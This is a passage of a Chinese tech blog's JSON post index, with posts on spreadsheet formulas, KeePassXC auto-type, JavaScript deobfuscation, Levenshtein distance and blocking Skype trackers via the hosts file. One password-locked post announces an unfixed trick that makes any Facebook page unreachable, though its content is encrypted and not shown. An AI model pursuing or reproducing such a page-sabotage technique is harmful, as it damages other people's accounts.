t6O5vZrn0I/IJPNn73v33ujO4mb6OHquiZhqdd4xIGhYMOte3BH6qwmSVzC9s2GLnuXGOiILof870ULpUUFe6xufuw3mUdceD8zZ128wt7EXpa1U7vPEIl+HzOgf1vDW0u4XeZzplxf+YpAz43L96jhaKf/PCQFnPUmOx3egmUhBD0iFUJ8Uq8s3Zov9JykbO/HSbUIOSiOHo3PeEukGBaux6zrGt6nyBkSgGsFKVLF0vj8tIiwqkcI1+BCJoSvxzcNH3FFivupMBXUNfjOtU9VryV0Old694/An8d5vNoFyfsg4/H+rI+B7uADVexFPozAYPZVizQiRNDbDmds/RWGCcizTIq3T4ZnIaaN2xCtPFepz4jbBhws7owr9YScvXzE4wvhBOvo1KkH9qjdxoZh7Bo3E9NnQ7003WJxmuXvmDy7eQtE/gnSagiky/RJollj8391ETtF+M3LAurdnAfMvU8/5yctlRLLXRwTgn14k7P9HfasWPbXLZmanJRAlrSNt40TZ0qVg4hZJzBdakmF72NF1L6/Xlz2/T7IBV/sP/iwoFzoqMQNTosfva6GuoV4IMOn7VNKiIk8JrThFjR7QepGOq0qYfUKV3WI75sssSuMUJNTHKGkCXN56xcRVrmHqFYYWGpGdMN23T7KMoPOrq8KYARg8Q4JaT6onpG1Y9Fb2VmKB/sNAQ7eumWkev1w9FhdNt+jtKH4v+OzSaXpGi6m14suttdBI/MibdFn8fOFjxNxtZWNAIKtjrFc2hcYBW2DaYFLHTpxrc5sOtlwbYj+C7hquI4ym78CmSAl+lo7KVxS/gfAlR3V64uPXUAhBtSNOTUJYdgx5jPKoh+DC2IYUgX8PF5RWHMiB6fH4dkV+mZbSrsFIEEUdsIOe+xNPiJuXFXTnMq1tzjnoJCBFWnRYmy1e58lVD4663AUqSo6CFfOYjFAYsepC4G3fKUE2BodL/HAl+JLLB3p4gXt0nd4H8qBYgNLukHiiFaSS0zM4C47E/9Yq8Yisn7VaOaHCA5oTT26DhP4Puq2MQfZbyh6rsS7ki4S1TbPjk2ybVQlnwjQUehCDg3419xE5RBL+WusenIXL/SfKV0ULU0Eug4BtfQM62X+5vPaZCgbpu5bOxZjfiY7MJUf9ZY54diDTXGvcR4S2hDqmMHDZW7ql2ApuHIgU8r5y63TY11ld6/YGUnY5n5vlKhRyGij7rndLKcI70az30oVGKssbJXUwekMjpZZm7/htEFjQAmLuIjuF2i3ptGZIiYSzzPAjJKoJS90QwGbxTbXLL0WyAQbV3oXRaiUIbsq6vrN1uuoboaV0MZRjQ8eDzySusCGTqiLQ2cnymuhzNgDaaGpBzAVn7B4P0cJyIkYtajmbwCLyC590NEOujEpMyH/NbhoSPIEd10kkqXAlnAu6KNNeUpeORwdZMQElsbIKx1Ark5B46AddbWLZiJ92pFMkytwofACfb0G+lhW1ZyYlfzOw4sRwFH8A+gUO2fGreLG\",f=b.substring(0,64),d=b.substring(64),g=CryptoJS.HmacSHA256(d,CryptoJS.SHA256(a).toString()).toString();if(g!==f){alert(\"Wrong Password!\");return}var h=c(d,a);document.getElementById(\"article\").innerHTML=h}) ","tags":[{"index":-1,"name":"其它","slug":"other","used":true,"link":"https://dev-coco.github.io/tag/other/"}],"title":"免费获取 YouTube 订阅者","feature":"https://dev-coco.github.io/post-images/Free-YouTube-Subscribers.png","link":"https://dev-coco.github.io/post/Free-YouTube-Subscribers/","stats":{"text":"2 min read","time":99000,"words":274,"minutes":2},"date":"2023-07-12 11:49:28","dateFormat":"2023-07-12"},{"content":"横向/纵向数组求和。 横向求和 =ARRAYFORMULA(MMULT(IFERROR(B1:F17 + 0, 0), TRANSPOSE(COLUMN(B1:F17) ^ 0))) 原理分析 IFERROR(B1:F17 + 0, 0) 将数据范围中的所有单元格转换成数值，如果单元格内的数据类型是非数值型将会用 0 代替，避免因为非数值类型导致计算出错。 TRANSPOSE(COLUMN(B1:F17) ^ 0) COLUMN 函数计算包含指定范围内列号的数组，返回一个包含从 B 列到 F 列序号的数组，即 [2, 3, 4, 5, 6]。 然后将数组的每个元素提升为 0 次幂进行运算，所有的返回结果将会是 1，也就是 [1, 1, 1, 1, 1]。 再使用 TRANSPOSE 转置数组，把行转换为列。 使用 MMULT 函数使用矩阵乘法计算每个元素的值，最后使用 ARRAYFORMULA 数组输出。下图中 A 列是输出的结果。 纵向求和 =TRANSPOSE(ARRAYFORMULA(MMULT(IFERROR(TRANSPOSE(B1:F17) + 0, 0), ROW(B1:F17) ^ 0))) 原理分析 和上面的横向求和思路类似，先将 B1:F17 范围的内容转置，并且把数据范围中的所有单元格转换成数值类型。 使用 ROW 函数计算包含指定范围内行号数组，返回从第 1 行到第 17 行的序号数组，即 [1, 2, 3, 4, 5, 6, 7, 8, 9, 10, 11, 12, 13, 14, 15, 16, 17]。 然后将数组的每个元素提升为 0 次幂进行运算，所有的返回结果将会是 1，也就是 [1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1]。 使用 MMULT 函数使用矩阵乘法计算每个元素的值，使用 ARRAYFORMULA 数组输出。但是输出的结果是以列显示的，需要再使用 TRANSPOSE 转置数组，把行转换为列。最终结果输出在 B18 单元格。 相关推荐： Google Excel 性能优化 - 数组输出 Google Excel LAMBDA 和 MAP 组合函数 ","tags":[{"name":"Excel","slug":"excel","used":true,"link":"https://dev-coco.github.io/tag/excel/"}],"title":"Google Excel 数组求和","feature":"https://dev-coco.github.io/post-images/Google-Excel-Array-Sum.jpg","link":"https://dev-coco.github.io/post/Google-Excel-Array-Sum/","stats":{"text":"2 min read","time":114000,"words":480,"minutes":2},"date":"2023-07-11 00:33:51","dateFormat":"2023-07-11"},{"content":"一键快速清理 Google 云端与我共享所有记录。 在 Google 云端中，打开任意其他人共享的文件，例如表格、文档、图片等等，就会在「与我共享」留下文件记录，云端使用一段时间后就会留下特别多的文件记录，下面介绍一个非常简单的方法可以批量把所有「与我共享」的记录都清理掉，但并不会删除云端内的任何文件。 使用方法 打开：书签代码 将「清理与我共享」拖到浏览器的书签栏。 打开 Google 云端「与我共享」界面，然后点击书签的「清理与我共享」就会开始清理「与我共享」列表中的记录了，在运行的过程中会看到文件一个个的消失。不过需要注意的是记录删除后不可恢复，只有再次打开其他人共享的文件时才会出现在「与我共享」的列表中。 ","tags":[{"index":-1,"name":"其它","slug":"other","used":true,"link":"https://dev-coco.github.io/tag/other/"}],"title":"批量清理 Google 云端与我共享","feature":"https://dev-coco.github.io/post-images/Google-Drive-Share-Clean.png","link":"https://dev-coco.github.io/post/Google-Drive-Share-Clean/","stats":{"text":"1 min read","time":51000,"words":253,"minutes":1},"date":"2023-07-09 10:38:56","dateFormat":"2023-07-09"},{"content":"快捷输入账号密码。 使用前需要在浏览器安装：KeePassXC-Browser 在 KeePassXC 软件的「设置 - 浏览器集成」中，开启「启用浏览器集成」。 点击 KeePassXC-Browser 插件，点击「连接」。 自定义输入一个唯一的 ID，如果有多个浏览器人员同时使用，不能输入已经使用过的 ID，否则会被覆盖。 对着插件点击右键，点击「选项」。 建议将「自动检索凭据」取消勾选，这样打开有些网站的时候，不会一直弹出窗口要求输入账号密码（因为有时候并不想登陆）。 勾选「自动提交登陆表单」，这样自动输入完账号密码后就直接登陆了，免去了自动输入完账号密码还需要点一下登陆按钮的步骤。 打开需要登陆的页面，在输入账号框的右侧会出现 KeePassXC 的图标，点击账号输入框或者图标，就会自动输入账号密码并且登陆。 如果是第一次在页面登陆，会出现下图的提示，勾选记住，那么下次就不会再提示这个访问请求，自动输入完账号密码后就登陆了。 ","tags":[{"index":-1,"name":"安全","slug":"security","used":true,"link":"https://dev-coco.github.io/tag/security/"},{"name":"软件","slug":"software","used":true,"link":"https://dev-coco.github.io/tag/software/"},{"index":-1,"name":"macOS","slug":"macos","used":true,"link":"https://dev-coco.github.io/tag/macos/"}],"title":"KeePassXC 自动输入（二）","feature":"https://dev-coco.github.io/post-images/KeePassXC-Auto-Type-1.png","link":"https://dev-coco.github.io/post/KeePassXC-Auto-Type-2/","stats":{"text":"2 min read","time":64000,"words":313,"minutes":2},"date":"2023-07-06 22:42:44","dateFormat":"2023-07-06"},{"content":"快捷自动输入账号密码。 在 KeePassXC 的「设置 - 常规 - 自动输入」中，建议将「总在执行自动输入前询问」关闭。「全局自动输入快捷键」设置一个触发自动输入的快捷键，点击「确定」保存。 在「编辑条目 - 自动输入」中，默认的自动输入设置是 {USERNAME}{TAB}{PASSWORD}{ENTER}，这个配置可以用于大多数只输入账号和密码的页面，不过遇到一些特殊的或者需要二步验证的就需要自定义配置了。 常用参数 下面是一些常用的参数。 参数 描述 {TITLE} 标题 {USERNAME} 用户名 {PASSWORD} 密码 {URL} 链接 {NOTES} 备注 {TOTP} 二步验证 {TAB}、{ENTER}、{SPACE}、{INSERT}{DELETE}、{HOME}、{END}、{PGUP}{PGDN}、{BACKSPACE}、{CAPSLOCK}、{ESC} 对应键盘的按键 {UP}, {DOWN}, {LEFT}, {RIGHT} 方向键 {LEFTBRACE}, {RIGHTBRACE} 分别代表 {} {&lt;KEY&gt; X} 按键重复次数，例如 {SPACE 5}，输入空格5次 {DELAY X} 延迟指定毫秒时间 {CLEARFIELD} 清空内容 清空内容 配置参数 例子一 在配置自动输入参数之前，需要先登陆一遍账号，理解整个登陆过程中的操作，然后再写参数。下面就以需要二步验证的 Google 账号为例。 第一步先输入账号，按下回车键后跳转到下一个界面。 输入密码后，按下回车键跳转到下一个界面。 输入二步验证后再按下回车键后，整个登陆的流程就结束了。 输入账号，需要用到 {USERNAME} 输入账号，按下回车键使用 {ENTER}，然后会跳转到下一个界面，这个过程会有一点延迟的时间，所以需要用 {DELAY 2000}，毫秒单位，2000 就是 2 秒的间隔时间，这个根据网络的情况可以自行调整。 到第二个界面后，使用 {PASSWORD} 输入密码，再使用 {ENTER} 按下回车键到下一个界面，同样需要用 {DELAY 2000} 进行延迟，等到跳转到下一个界面。 到第三个界面后，使用 {TOTP} 输入二步验证，最后再使用 {ENTER} 按下回车键完成登陆。 完整的配置如下： {USERNAME}{ENTER}{DELAY 2500}{PASSWORD}{ENTER}{DELAY 2500}{TOTP}{ENTER} 在「窗口关联」这个地方可以添加多个「窗口标题」，这样就可以在任意和 Google 相关的界面登陆账号了，例如：Google 主页、Gmail、YouTube、云端硬盘等等。 例子二 还有一种情况，有双层密码，第一层是使用 htaccess 给网站加密，第二层是页面登陆。 第一层加密会弹出下面的输入框。 那么可以使用 {USERNAME}{TAB}{PASSWORD}{ENTER} 输入第一层账号和密码，然后会加载登陆页面。使用 {DELAY 3000} 延迟 3 秒，等待网页加载完成，如果网页加载的时间比较久，久需要把延迟时间设置得更长。然后把第二层的密码放在备注里，账号和密码之间使用制表符（Tab）间隔。然后再使用 {NOTES} 输入备注里面的账号密码，最后 {ENTER} 按下回车键登陆账号，整个登陆流程就完成了。 完整的配置如下： {USERNAME}{TAB}{PASSWORD}{ENTER}{DELAY 3000}{NOTES}{ENTER} ","tags":[{"index":-1,"name":"安全","slug":"security","used":true,"link":"https://dev-coco.github.io/tag/security/"},{"name":"软件","slug":"software","used":true,"link":"https://dev-coco.github.io/tag/software/"},{"index":-1,"name":"macOS","slug":"macos","used":true,"link":"https://dev-coco.github.io/tag/macos/"}],"title":"KeePassXC 自动输入（一）","feature":"https://dev-coco.github.io/post-images/KeePassXC-Auto-Type-1.png","link":"https://dev-coco.github.io/post/KeePassXC-Auto-Type-1/","stats":{"text":"3 min read","time":176000,"words":808,"minutes":3},"date":"2023-07-01 16:57:43","dateFormat":"2023-07-01"},{"content":"还原 JavaScript 混淆后的代码。 工具链接：JavaScript Deobfuscator 输入混淆的代码，选择参数，点击反混淆即可将混淆的代码还原出来。以下是参数的介绍。 atob 解密 将 atob 的运行结果解析为字符串。 例子： const test = atob('UmF6MW5lcg==') 结果： const test = 'Raz1ner'; 赋值替换文本 解析赋值表达式，用运行的结果替换变量。 例子： const a = 'Hello' + ' World!' console.log(a) 结果： const a = 'Hello World!'; console.log('Hello World!'); 非 obfuscator.io 混淆 不检测使用 obfuscator.io 工具混淆的代码，加快反混淆代码的运行速度。 移除无效变量 移除未引用的变量。 例子： function abc () { const test = atob('UmF6MW5lcg==') var kaka return test } 结果： function abc() { const test = atob('UmF6MW5lcg=='); return test; } ","tags":[{"name":"Javascript","slug":"javascript","used":true,"link":"https://dev-coco.github.io/tag/javascript/"}],"title":"JavaScript 反混淆","feature":"https://dev-coco.github.io/post-images/JavaScript-Deobfuscator.png","link":"https://dev-coco.github.io/post/JavaScript-Deobfuscator/","stats":{"text":"1 min read","time":45000,"words":187,"minutes":1},"date":"2023-06-25 09:45:39","dateFormat":"2023-06-25"},{"content":"详细解释算法的原理以及计算过程。 这是由俄罗斯科学家 Vladimir Levenshtein 在 1965 年提出的这个概念。计算两个文本之间，从第一个文本转换成第二个文本所使用最少的步骤。 对一个文本进行以下三种操作 替换一个字符 删除一个字符 添加一个字符 定义 如果分别用 |a| 和 |b| 表示 a,b 两个字符串的长度，那么它们的列文斯坦距离为 leva,b(|a|,|b|)，它符合： l(ai≠bj) 是一个指示函数，当 ai = bj 时，其值为 0，其他时候它等于 1 。 leva,b(i,j) 表示 a 的前 i 个字符与 b 的前 j 个字符之间的列文斯坦距离。（i 和 j 都是从 1 开始的下标） 注意：min运算中的第一个公式代表（ 从 a 中）删除字符（以到达 b）；第二个公式代表插入字符；第三个代表替换（取决于当前字符是否相同）。 代码 function levenshteinDistance (a, b) { const m = a.length const n = b.length const d = [] for (let i = 0; i &lt;= n; i++) d[i] = [i] for (let j = 0; j &lt;= m; j++) d[0][j] = j for (let i = 1; i &lt;= n; i++) { for (let j = 1; j &lt;= m; j++) { d[i][j] = a[j - 1] === b[i - 1] ? d[i - 1][j - 1] : Math.min(d[i - 1][j], d[i][j - 1], d[i - 1][j - 1]) + 1 } } return d[n][m] } $ lev_ {a,} $ b(|a|,|b|) 原理 例如计算 horse 单词转换成 ros 单词需要使用的最少步骤。 结果是最少需要三个步骤，算法如下： 步骤一：horse &gt; rorse (&quot;h&quot; 替换 &quot;r&quot;) 步骤二：rorse &gt; rose (删除 &quot;r&quot;) 步骤三：rose &gt; ros (删除 &quot;e&quot;) 实例 例如，计算 dance 转换成 pacaed 需要使用最少的步骤。（这个词是我作为例子生造的，没有其它特殊意义。） 那么先将这两个单词的每一个字符列出一个矩阵，每个单词的的开头保留一个空值。 先来计算第一行。两个空值是一致的，不需要进行任何的操作，所以将一个空值转换成空值，需要使用最少的步骤是 0。 将一个空值和 d 转换成空值，已知第一个步骤不需要进行任何的操作，但是第二个字符是多余的，需要将 d 删除，所以将空值和 d 转换成空值最少需要用到的步骤是 1。 那么继续往右计算，将一个空值和 da 转换成空值。和空值对比，da 是多余的字符，所以需要两个删除字符的步骤才能转换成和空值一致。 那么后面以此类推都是一样的，这里就可以“偷个懒”，往右直接加 1 就可以了。因为后面比空值都多一个字符，所以都需要多一个删除字符的步骤。 纵列也是一样的算法，将空值转换成空值和 p，需要使用删除字符，将 p 删掉，所以需要用到的步骤是 1。 下面的算法一样，直接往下加 1 即可。 继续计算第二行，将空值 d 转换成空值 p 所需的步骤，只需要将 d 替换成 p，所以需要用到的步骤是 1。计算的原理是这样的，如果遇到很长的字符这样算起来就太慢，下面介绍一个便捷的算法，先对比当前对应的字符是否一致。 如果不一致，就从矩阵中取这个范围内最小的值，也就是 0，然后再加 1。 那么就得出了将将空值 d 转换成空值 p 所需的步骤。 后面也是一样的算法，判断 a 和 p 是否一致，如果不一样，从矩阵中取这个范围内最小值，也就是 1，再加上 1。 那么就得出了将将空值 da 转换成空值 p 所需的步骤是 2。 还有一个更便捷的计算方法，判断在所有的范围里，是否包含 p，若不包含，根据上面的步骤，先计算出第一个所需的步骤，然后往后加 1 即可。 下面也是一样的算法， 先判断对应的字符，a 和 d 是否一致，若是不一致，从矩阵中取这个范围内最小值再加上 1。 所以得出的结果是 2。 如果对应字符一致，只需要从矩阵中取这个范围最小值，不需要加 1，因为相同的两个字符不需要任何的操作。 所以结果是 1。 后面的内容和 a 都不一致，从矩阵中取这个范围的最小值，也就是 1。因为 n 和 a 是不一致的，需要将最小值再加 1。剩下的往右加 1 即可。 继续往下计算，对应的 c 和 d 不一致，从矩阵中取这个范围内最小值再加上 1。 结果是 3。 往右也是一样的算法，判断 a 和 c 是否一致，如果不一致，从矩阵中取这个范围内最小值再加上 1。 不过需要注意的是最小值的位置不固定，可能会在第二个格子，也有可能会在第一个格子，所以不管存在哪个位置都取最小值。因为我看到有些解释是从第一个格子取值，但是这样的算法并不准确，在某些情况下会算错。 后面的算法都是一样的，就不一一举例了，只需要注意当前要计算对应的字符是否一致，判断是否需要加 1。 全部算完后，右下角的格子就是最终的结果，也就是说从 dance 转换成 pacaed 最少需要四个步骤。 ","tags":[{"name":"Javascript","slug":"javascript","used":true,"link":"https://dev-coco.github.io/tag/javascript/"}],"title":"Levenshtein distance 编辑距离算法","feature":"https://dev-coco.github.io/post-images/Levenshtein-Distance.jpg","link":"https://dev-coco.github.io/post/Levenshtein-Distance/","stats":{"text":"6 min read","time":328000,"words":1469,"minutes":6},"date":"2023-06-18 06:38:07","dateFormat":"2023-06-18"},{"content":"使用 hosts 屏蔽 Skype 内置的新闻功能。 Skype 在更新至 8.98.0.402 版本后新增了一个新闻功能。点击「今天」就可以浏览新闻，这些新闻资讯是由 MSN 提供的。 但是发现一个很奇怪的事情，它会收集数据然后访问中国地区的域名。 下面的视频是抓包新闻页面的网络请求数据。 除了 MSN 以外，有两个域名特别可疑分别是「s3m2.nzwgs.com」和「s3m2.fenxi.com」，查了一下备案，这两个域名都是中国内地公司所持有的域名。 为了避免再次误点进入新闻页面，可以使用 hosts 屏蔽掉内置的广告以及追踪器。 hosts 路径 Windows C:\\windows\\system32\\drivers\\etc macOS /private/etc/ 屏蔽的 hosts 域名 这里会屏蔽掉一些 MSN 相关的站点。 127.0.0.1 browser.pipe.aria.microsoft.com 127.0.0.1 browser.events.data.msn.cn 127.0.0.1 gateway.bingviz.microsoftapp.net 127.0.0.1 www.msn.com 127.0.0.1 srtb.msn.com 127.0.0.1 assets.msn.com 127.0.0.1 www.msn.cn 127.0.0.1 api.msn.cn 127.0.0.1 c.msn.cn 127.0.0.1 img-s.msn.cn 127.0.0.1 assets.msn.cn 127.0.0.1 ts1.cn.mm.bing.net 127.0.0.1 ts2.cn.mm.bing.net 127.0.0.1 ts3.cn.mm.bing.net 127.0.0.1 ts4.cn.mm.bing.net 127.0.0.1 s3m4.fenxi.com 127.0.0.1 s3m2.nzwgs.com 下面这个是 masOS 系统添加 hosts 的 Shell 脚本，打开 Terminal，输入下面的脚本运行即可。 echo &quot;&quot; &gt;&gt; /private/etc/hosts &amp;&amp; echo &quot;127.0.0.1 browser.pipe.aria.microsoft.com&quot; &gt;&gt; /private/etc/hosts &amp;&amp; echo &quot;127.0.0.1 browser.events.data.msn.cn&quot; &gt;&gt; /private/etc/hosts &amp;&amp; echo &quot;127.0.0.1 gateway.bingviz.microsoftapp.net&quot; &gt;&gt; /private/etc/hosts &amp;&amp; echo &quot;127.0.0.1 www.msn.com&quot; &gt;&gt; /private/etc/hosts &amp;&amp; echo &quot;127.0.0.1 srtb.msn.com&quot; &gt;&gt; /private/etc/hosts &amp;&amp; echo &quot;127.0.0.1 assets.msn.com&quot; &gt;&gt; /private/etc/hosts &amp;&amp; echo &quot;127.0.0.1 www.msn.cn&quot; &gt;&gt; /private/etc/hosts &amp;&amp; echo &quot;127.0.0.1 api.msn.cn&quot; &gt;&gt; /private/etc/hosts &amp;&amp; echo &quot;127.0.0.1 c.msn.cn&quot; &gt;&gt; /private/etc/hosts &amp;&amp; echo &quot;127.0.0.1 img-s.msn.cn&quot; &gt;&gt; /private/etc/hosts &amp;&amp; echo &quot;127.0.0.1 assets.msn.cn&quot; &gt;&gt; /private/etc/hosts &amp;&amp; echo &quot;127.0.0.1 ts1.cn.mm.bing.net&quot; &gt;&gt; /private/etc/hosts &amp;&amp; echo &quot;127.0.0.1 ts2.cn.mm.bing.net&quot; &gt;&gt; /private/etc/hosts &amp;&amp; echo &quot;127.0.0.1 ts3.cn.mm.bing.net&quot; &gt;&gt; /private/etc/hosts &amp;&amp; echo &quot;127.0.0.1 ts4.cn.mm.bing.net&quot; &gt;&gt; /private/etc/hosts &amp;&amp; echo &quot;127.0.0.1 s3m4.fenxi.com&quot; &gt;&gt; /private/etc/hosts &amp;&amp; echo &quot;127.0.0.1 s3m2.nzwgs.com&quot; &gt;&gt; /private/etc/hosts &amp;&amp; echo &quot;设置完成&quot; ","tags":[{"index":-1,"name":"安全","slug":"security","used":true,"link":"https://dev-coco.github.io/tag/security/"},{"name":"软件","slug":"software","used":true,"link":"https://dev-coco.github.io/tag/software/"}],"title":"屏蔽 Skype 内置新闻功能","feature":"https://dev-coco.github.io/post-images/Skype-Disable-News.png","link":"https://dev-coco.github.io/post/Skype-Disable-News/","stats":{"text":"4 min read","time":224000,"words":700,"minutes":4},"date":"2023-06-13 09:40:38","dateFormat":"2023-06-13"},{"content":"5 行代码让 Facebook 专页异常，无法打开。 staticrypt-form{background:#fff;max-width:360px;margin:0 auto;padding:45px;text-align:center;box-shadow:0 0 20px 0 rgba(0,0,0,.2),0 5px 5px 0 rgba(0,0,0,.24)}.staticrypt-form input{background:#f2f2f2;width:100%;margin:0 0 15px;padding:15px;box-sizing:border-box;font-size:14px}.staticrypt-form .staticrypt-decrypt-button{background:#4caf50;width:100%;padding:15px;color:#fff;font-size:14px} 这是 Facebook 专页的一个 BUG，可以让专页除了管理员以外都无法打开，类似于取消发布的效果，而且常规方法无法恢复正常。尝试写信给 Facebook 反馈过此 BUG，但是并没有被修复。 免责声明，仅供用于学习研究，请勿用于非法用途。 请输入密码后查看 var a=256,b=1e3;function c(c,d){var e=CryptoJS.enc.Hex.parse(c.substr(0,32)),f=CryptoJS.enc.Hex.parse(c.substr(32,32)),g=c.substring(64),h=CryptoJS.PBKDF2(d,e,{keySize:a/32,iterations:b}),i=CryptoJS.AES.decrypt(g,h,{iv:f,padding:CryptoJS.pad.Pkcs7,mode:CryptoJS.mode.CBC}).toString(CryptoJS.enc.Utf8);return i}document.getElementById(\"staticrypt-form\").addEventListener(\"submit\",function(e){e.preventDefault();var a=document.getElementById(\"staticrypt-password\").value,b=\"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\",f=b.substring(0,64),d=b.substring(64),g=CryptoJS.HmacSHA256(d,CryptoJS.SHA256(a).toString()).toString();if(g!==f){alert(\"Wrong Password!\");return}var h=c(d,a);document.getElementById(\"article\").innerHTML=h}) 